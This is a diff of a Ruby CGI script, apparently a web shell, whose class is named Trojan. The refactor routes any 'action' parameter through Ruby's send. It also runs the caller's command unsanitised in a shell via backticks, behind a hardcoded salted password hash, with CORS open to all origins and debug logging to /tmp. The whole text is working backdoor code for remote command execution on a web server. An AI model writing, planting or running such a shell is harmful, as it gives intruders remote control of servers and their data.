@@ -4,28 +4,30 @@ require 'cgi'
 require 'digest/sha1'
 require 'json'
 
+require 'logger'
+$logger = Logger.new('/tmp/wash.log')
+
 class Trojan
     attr_accessor :cgi, :cwd, :response
 
     def initialize params
         @cgi      = params[:cgi]
-        @cwd      = (params['args[cwd]'].nil?) ? `pwd`.strip! : params['args[cwd]']
+        @cwd      = (@cgi.params['args[cwd]'].first.empty?) ? `pwd`.strip! : @cgi.params['args[cwd]'].first
         @response = {
             'error'  => '',
             'output' => {},
-        };
+        }
+
+        $logger.debug('cw fucking d: ' + @cwd)
     end
 
-    def process_command()
+    def process_command
         json = @cgi.params
-        if json['action'].first.eql? 'shell'
-            process_shell_command(json['args[cmd]'].first)
-        else
-            send json['action'].first, json
-        end
+        send json['action'].first, json
     end
 
-    def process_shell_command command
+    def shell json
+        command                       = json['args[cmd]'].first
         out_lines                     = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
         @response['output']['cwd']    = @cwd = out_lines.pop
         @response['output']['stdout'] = out_lines.join "\n"
@@ -59,13 +61,10 @@ end
 # ---------- Procedural code starts here ----------
 cgi  = CGI.new
 
-
 hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + 'c5e5f704ee')
 if hash.eql? '003da5748a1cdeac275548be9741cb35b76f773d'
-
     trojan = Trojan.new({ :cgi => cgi })
     trojan.process_command
-
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
     puts '{"error":"Invalid password."}'
